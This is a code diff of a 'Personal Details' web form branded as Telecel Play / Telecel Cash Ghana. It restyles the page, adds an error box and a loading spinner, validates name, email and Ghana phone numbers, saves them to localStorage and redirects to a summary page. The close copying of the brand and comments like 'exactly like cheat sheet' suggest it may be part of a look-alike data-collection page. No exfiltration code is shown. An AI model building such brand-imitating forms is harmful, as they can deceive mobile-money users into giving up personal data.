@@ -3,11 +3,11 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
     <title>Telecel Play | Personal Details – play.telecel.com.gh</title>
     <link rel="icon" href="https://play.telecel.com.gh/favicon.ico" type="image/x-icon">
     <meta name="theme-color" content="#E30613">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -22,15 +22,15 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            padding: clamp(16px, 3vw, 24px);
+            padding: 12px;
         }
 
         header {
             width: 100%;
             max-width: 480px;
-            padding: clamp(16px, 4vw, 24px);
+            padding: 12px 16px;
             text-align: center;
-            margin-bottom: clamp(16px, 4vw, 28px);
+            margin-bottom: 12px;
             background: white;
             border-radius: 12px;
             box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
@@ -38,21 +38,22 @@
         }
 
         .back-btn {
-            font-size: clamp(28px, 7vw, 32px);
+            font-size: 28px;
             background: none;
             border: none;
             cursor: pointer;
             color: #2c3e50;
             position: absolute;
-            left: 20px;
+            left: 16px;
             top: 50%;
             transform: translateY(-50%);
+            line-height: 1;
         }
 
         .logo {
-            font-size: clamp(32px, 8vw, 40px);
+            font-size: clamp(28px, 7vw, 40px);
             font-weight: 800;
-            letter-spacing: -1px;
+            letter-spacing: -0.5px;
         }
 
         .logo-telecel {
@@ -68,13 +69,52 @@
             max-width: 480px;
             width: 100%;
             margin: 0 auto;
+            position: relative;
         }
 
         .form-card {
             background: white;
             border-radius: 20px;
-            padding: clamp(28px, 6vw, 40px) clamp(24px, 5vw, 32px);
+            padding: 24px 18px 32px;
             box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
+            position: relative;
+        }
+
+        /* Error box – exactly like cheat sheet */
+        .error-box {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            right: 12px;
+            background: #fff;
+            border: 2px solid #ff4d4d;
+            border-radius: 14px;
+            padding: 12px;
+            display: none;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
+            z-index: 100;
+            text-align: left;
+        }
+
+        .error-title {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .error-text {
+            color: #444;
+            font-size: 13px;
+        }
+
+        .close {
+            position: absolute;
+            right: 12px;
+            top: 8px;
+            cursor: pointer;
+            font-size: 20px;
+            color: #999;
         }
 
         .form-title {
@@ -82,7 +122,7 @@
             font-weight: 700;
             color: #1a1a1a;
             text-align: center;
-            margin-bottom: 1.5rem;
+            margin-bottom: 1.2rem;
         }
 
         .progress-bar {
@@ -90,7 +130,7 @@
             height: 8px;
             background: #e9ecef;
             border-radius: 4px;
-            margin: 1.5rem auto 1rem;
+            margin: 1rem auto 0.8rem;
             overflow: hidden;
         }
 
@@ -104,25 +144,25 @@
         .step-text {
             text-align: center;
             color: #6c757d;
-            font-size: 1rem;
-            margin-bottom: 2rem;
+            font-size: 0.9rem;
+            margin-bottom: 1.8rem;
         }
 
         .form-group {
-            margin-bottom: 1.8rem;
+            margin-bottom: 1.5rem;
         }
 
         .form-label {
             display: block;
             font-weight: 600;
             color: #2c3e50;
-            margin-bottom: 0.6rem;
-            font-size: 0.95rem;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
         }
 
         .form-input {
             width: 100%;
-            padding: 1rem 1.2rem;
+            padding: 0.9rem 1rem;
             border: 1px solid #ced4da;
             border-radius: 10px;
             font-size: 1rem;
@@ -136,22 +176,16 @@
             box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.15);
         }
 
-        .invalid {
+        .form-input.invalid,
+        #phoneGroup.invalid {
             border-color: #dc3545 !important;
             box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.15) !important;
         }
 
-        .field-error {
-            color: #dc3545;
-            font-size: 0.875rem;
-            margin-top: 0.4rem;
-            display: none;
-        }
-
         .name-group {
             display: flex;
-            gap: 1.2rem;
-            margin-bottom: 1.8rem;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
         }
 
         .name-group>div {
@@ -161,18 +195,19 @@
         .btn-group {
             display: flex;
             gap: 1rem;
-            margin-top: 2.5rem;
+            margin-top: 2rem;
         }
 
         .prev-btn,
         .next-btn {
             flex: 1;
-            padding: 1.15rem;
+            padding: 1rem;
             border-radius: 12px;
-            font-size: 1.15rem;
+            font-size: 1rem;
             font-weight: 700;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: 0.2s;
+            touch-action: manipulation;
         }
 
         .prev-btn {
@@ -181,37 +216,126 @@
             border: none;
         }
 
-        .prev-btn:hover {
-            background: #cbd5e1;
+        .prev-btn:active {
+            transform: scale(0.97);
         }
 
         .next-btn {
             background: linear-gradient(90deg, #E30613, #b71c1c);
             color: white;
             border: none;
-            box-shadow: 0 8px 24px rgba(227, 6, 19, 0.25);
+            box-shadow: 0 6px 18px rgba(227, 6, 19, 0.25);
         }
 
-        .next-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 32px rgba(227, 6, 19, 0.35);
+        .next-btn:active {
+            transform: scale(0.97);
+        }
+
+        .next-btn.disabled-btn,
+        .next-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
         }
 
         footer {
-            padding: clamp(20px, 5vw, 32px) 20px;
+            padding: 20px 16px;
             color: #adb5bd;
-            font-size: clamp(12px, 3vw, 14px);
+            font-size: 12px;
             text-align: center;
             margin-top: auto;
+        }
+
+        /* Spinner overlay – cheat sheet style */
+        #spinner {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(2px);
+            z-index: 999;
+        }
+
+        .loader {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #ffe0e0;
+            border-top: 4px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 380px) {
+            body {
+                padding: 8px;
+            }
+
+            .form-card {
+                padding: 20px 14px;
+            }
+
+            .form-input {
+                padding: 0.8rem 0.9rem;
+                font-size: 0.9rem;
+            }
+
+            .name-group {
+                gap: 0.8rem;
+                flex-direction: column;
+                margin-bottom: 0.8rem;
+            }
+
+            .btn-group {
+                gap: 0.8rem;
+            }
+
+            .prev-btn,
+            .next-btn {
+                padding: 0.8rem;
+                font-size: 0.9rem;
+            }
         }
 
         @media (min-width: 769px) {
             body {
                 padding: 32px;
             }
+
             .form-card {
-                padding: 2.8rem 3.5rem;
+                padding: 2.5rem 3rem;
             }
+        }
+
+        #phoneGroup {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ced4da;
+            border-radius: 10px;
+            padding: 0 1rem;
+            background: #fdfdfe;
+        }
+
+        #phoneGroup span {
+            color: #6c757d;
+            font-weight: 500;
+            margin-right: 0.5rem;
+        }
+
+        #phoneGroup input {
+            flex: 1;
+            border: none;
+            outline: none;
+            padding: 0.9rem 0;
+            font-size: 1rem;
+            background: transparent;
         }
     </style>
 </head>
@@ -223,6 +347,13 @@
     </header>
     <main>
         <div class="form-card">
+            <!-- Error box – exactly like cheat sheet -->
+            <div class="error-box" id="errorBox">
+                <div class="close" onclick="hideError()">×</div>
+                <div class="error-title">Error</div>
+                <div class="error-text" id="errorText">Please fix the highlighted fields.</div>
+            </div>
+
             <h1 class="form-title">Personal Details</h1>
             <div class="progress-bar">
                 <div class="progress-fill"></div>
@@ -232,29 +363,25 @@
             <div class="name-group">
                 <div>
                     <label class="form-label">First Name</label>
-                    <input type="text" class="form-input" id="firstName" placeholder="e.g. Kwame">
-                    <div class="field-error" id="firstNameError">Please enter your first name.</div>
+                    <input type="text" class="form-input" id="firstName" placeholder="e.g. Kwame" autocomplete="off">
                 </div>
                 <div>
                     <label class="form-label">Last Name</label>
-                    <input type="text" class="form-input" id="lastName" placeholder="e.g. Mensah">
-                    <div class="field-error" id="lastNameError">Please enter your last name.</div>
+                    <input type="text" class="form-input" id="lastName" placeholder="e.g. Mensah" autocomplete="off">
                 </div>
             </div>
 
             <div class="form-group">
                 <label class="form-label">Email Address</label>
-                <input type="email" class="form-input" id="email" placeholder="e.g. kwame.mensah@example.com">
-                <div class="field-error" id="emailError">Please enter a valid email address.</div>
+                <input type="email" class="form-input" id="email" placeholder="e.g. kwame.mensah@example.com" autocomplete="off">
             </div>
 
             <div class="form-group">
                 <label class="form-label">Phone Number</label>
-                <div style="display:flex; align-items:center; border:1px solid #ced4da; border-radius:10px; padding:0 1.2rem;" id="phoneGroup">
-                    <span style="color:#6c757d; font-weight:500; margin-right:0.8rem;">+233</span>
-                    <input type="tel" id="phone" placeholder="551234567" maxlength="9" style="flex:1; border:none; outline:none; padding:1rem 0; font-size:1rem; background:transparent;">
+                <div id="phoneGroup">
+                    <span>+233</span>
+                    <input type="tel" id="phone" placeholder="55 123 4567" maxlength="9" inputmode="numeric" autocomplete="off">
                 </div>
-                <div class="field-error" id="phoneError">Please enter a valid 9-digit phone number.</div>
             </div>
 
             <div class="btn-group">
@@ -267,147 +394,145 @@
         © 2026 Telecel Ghana – Licensed Mobile Financial Services | Powered by Telecel Cash & Telecel Play
     </footer>
 
+    <div id="spinner">
+        <div class="loader"></div>
+    </div>
+
     <script>
-        // ─────────────────────────────────────────────
-        // PREFILL FROM LOCAL STORAGE
-        // ─────────────────────────────────────────────
-        const fields = ['firstName', 'lastName', 'email', 'phone'];
-
-        fields.forEach(id => {
-            const value = localStorage.getItem(id);
-            if (value) {
-                document.getElementById(id).value = value;
-            }
-        });
-
-        // ─────────────────────────────────────────────
-        // ELEMENTS
-        // ─────────────────────────────────────────────
+        // DOM elements
         const firstNameInput = document.getElementById('firstName');
         const lastNameInput = document.getElementById('lastName');
         const emailInput = document.getElementById('email');
         const phoneInput = document.getElementById('phone');
-
-        const firstNameError = document.getElementById('firstNameError');
-        const lastNameError = document.getElementById('lastNameError');
-        const emailError = document.getElementById('emailError');
-        const phoneError = document.getElementById('phoneError');
-
         const phoneGroup = document.getElementById('phoneGroup');
         const nextBtn = document.getElementById('nextBtn');
+        const spinner = document.getElementById('spinner');
+        const errorBox = document.getElementById('errorBox');
+        const errorText = document.getElementById('errorText');
 
-        // ─────────────────────────────────────────────
-        // VALIDATION FUNCTIONS
-        // ─────────────────────────────────────────────
-        function validateName(input, errorEl) {
-            if (!input.value.trim()) {
-                input.classList.add('invalid');
-                errorEl.style.display = 'block';
-                return false;
-            }
-            return true;
+        // No autofill: remove any localStorage pre‑population
+        // (Fields start empty)
+
+        function showError(message) {
+            errorText.innerText = message || 'Please fix the highlighted fields.';
+            errorBox.style.display = 'block';
         }
 
-        function validateEmail() {
-            const email = emailInput.value.trim();
-            if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-                emailInput.classList.add('invalid');
-                emailError.style.display = 'block';
-                return false;
-            }
-            return true;
+        function hideError() {
+            errorBox.style.display = 'none';
         }
 
-        function validatePhone() {
-            const phone = phoneInput.value.trim();
-            if (!/^\d{9}$/.test(phone)) {
-                phoneGroup.classList.add('invalid');
-                phoneError.style.display = 'block';
-                return false;
-            }
-            return true;
-        }
-
-        // ─────────────────────────────────────────────
-        // RESET ERRORS
-        // ─────────────────────────────────────────────
-        function resetErrors() {
-            document.querySelectorAll('.form-input').forEach(el => {
+        function resetInvalidHighlights() {
+            document.querySelectorAll('.form-input, #phoneGroup').forEach(el => {
                 el.classList.remove('invalid');
             });
-
-            phoneGroup.classList.remove('invalid');
-
-            document.querySelectorAll('.field-error').forEach(el => {
-                el.style.display = 'none';
-            });
         }
 
-        // ─────────────────────────────────────────────
-        // SCROLL TO FIRST ERROR
-        // ─────────────────────────────────────────────
-        function scrollToError() {
-            const firstInvalid = document.querySelector('.invalid');
-            if (firstInvalid) {
-                firstInvalid.scrollIntoView({
-                    behavior: 'smooth',
-                    block: 'center'
-                });
+        function isValidGhanaPhone(phoneDigits) {
+            if (!/^\d{9}$/.test(phoneDigits)) return false;
+            const firstDigit = phoneDigits.charAt(0);
+            return ['2', '5', '0', '4'].includes(firstDigit);
+        }
+
+        function validateForm() {
+            let isValid = true;
+            let errorMsg = '';
+
+            resetInvalidHighlights();
+            hideError();
+
+            const firstName = firstNameInput.value.trim();
+            const lastName = lastNameInput.value.trim();
+            const phoneRaw = phoneInput.value.trim();
+
+            if (!firstName) {
+                firstNameInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'First name is required.';
+            } else if (firstName.length < 2) {
+                firstNameInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'First name must be at least 2 characters.';
             }
+
+            if (!lastName) {
+                lastNameInput.classList.add('invalid');
+                isValid = false;
+                if (!errorMsg) errorMsg = 'Last name is required.';
+            } else if (lastName.length < 2) {
+                lastNameInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Last name must be at least 2 characters.';
+            }
+
+            if (!phoneRaw) {
+                phoneGroup.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Phone number is required.';
+            } else if (!/^\d{9}$/.test(phoneRaw)) {
+                phoneGroup.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Phone number must be exactly 9 digits (e.g., 551234567).';
+            } else if (!isValidGhanaPhone(phoneRaw)) {
+                phoneGroup.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Enter a valid Ghana mobile number (starts with 2,5,0,4).';
+            }
+
+            const email = emailInput.value.trim();
+            if (email && (!email.includes('@') || !email.includes('.') || email.length < 5)) {
+                emailInput.classList.add('invalid');
+                isValid = false;
+                errorMsg = 'Please enter a valid email address (e.g., name@domain.com).';
+            }
+
+            if (!isValid) {
+                showError(errorMsg || 'Please correct the highlighted fields.');
+                const firstInvalid = document.querySelector('.invalid');
+                if (firstInvalid) firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                return false;
+            }
+            return true;
         }
 
-        // ─────────────────────────────────────────────
-        // SAVE DATA
-        // ─────────────────────────────────────────────
-        function saveData() {
+        let isProcessing = false;
+
+        function proceedToSummary() {
+            if (isProcessing) return;
+            if (!validateForm()) return;
+
+            // Save data to localStorage (required for next page)
             localStorage.setItem('firstName', firstNameInput.value.trim());
             localStorage.setItem('lastName', lastNameInput.value.trim());
             localStorage.setItem('email', emailInput.value.trim());
             localStorage.setItem('phone', phoneInput.value.trim());
+
+            nextBtn.disabled = true;
+            nextBtn.classList.add('disabled-btn');
+            isProcessing = true;
+            spinner.style.display = 'flex';
+
+            setTimeout(() => {
+                window.location.href = 'summary.html';
+            }, 3000);
         }
 
-        // ─────────────────────────────────────────────
-        // BUTTON CLICK
-        // ─────────────────────────────────────────────
-        nextBtn.addEventListener('click', function() {
-            resetErrors();
+        nextBtn.addEventListener('click', proceedToSummary);
 
-            const isFirstValid = validateName(firstNameInput, firstNameError);
-            const isLastValid = validateName(lastNameInput, lastNameError);
-            const isEmailValid = validateEmail();
-            const isPhoneValid = validatePhone();
-
-            // Always save (even if invalid)
-            saveData();
-
-            // Show errors but DO NOT block button completely
-            if (!isFirstValid || !isLastValid || !isEmailValid || !isPhoneValid) {
-                scrollToError();
-            }
-
-            // You can control navigation behavior here 👇
-
-            // OPTION 1: Always proceed (even if invalid)
-            window.location.href = 'summary.html';
-
-            // OPTION 2 (safer): only proceed if valid
-            // if (isFirstValid && isLastValid && isEmailValid && isPhoneValid) {
-            //     window.location.href = 'summary';
-            // }
-        });
-
-        // ─────────────────────────────────────────────
-        // LIVE INPUT CLEANUP (better UX)
-        // ─────────────────────────────────────────────
-        document.querySelectorAll('input').forEach(input => {
-            input.addEventListener('input', () => {
-                input.classList.remove('invalid');
+        // Clear errors on input
+        const clearErrorOnInput = (el, groupEl = null) => {
+            el.addEventListener('input', () => {
+                hideError();
+                el.classList.remove('invalid');
+                if (groupEl) groupEl.classList.remove('invalid');
             });
-        });
+        };
+        clearErrorOnInput(firstNameInput);
+        clearErrorOnInput(lastNameInput);
+        clearErrorOnInput(emailInput);
+        clearErrorOnInput(phoneInput, phoneGroup);
 
-        phoneInput.addEventListener('input', () => {
-            phoneGroup.classList.remove('invalid');
-        });
+        window.hideError = hideError;
     </script>
 </body>
 
